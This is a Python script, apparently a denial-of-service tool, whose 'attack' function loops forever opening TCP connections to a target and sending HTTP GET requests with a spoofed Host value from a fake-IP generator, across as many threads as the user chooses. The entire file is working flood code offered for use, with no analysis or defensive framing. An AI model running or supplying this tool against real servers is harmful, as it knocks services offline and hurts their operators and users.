import socket
import threading
from handler import args_handler
from ipgen import fake_ip_gen

        
def attack(target, port, fake_ip):
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'))
            s.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
            s.close()
    except Exception as e:
        print(f"An error occurred: {str(e)}")

 
def main():
    target_ip, port, num_threads = args_handler() 

    fake_ip = fake_ip_gen()
    print(fake_ip)

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, port, fake_ip))
        thread.start()

  
if __name__ == '__main__':
    main()
 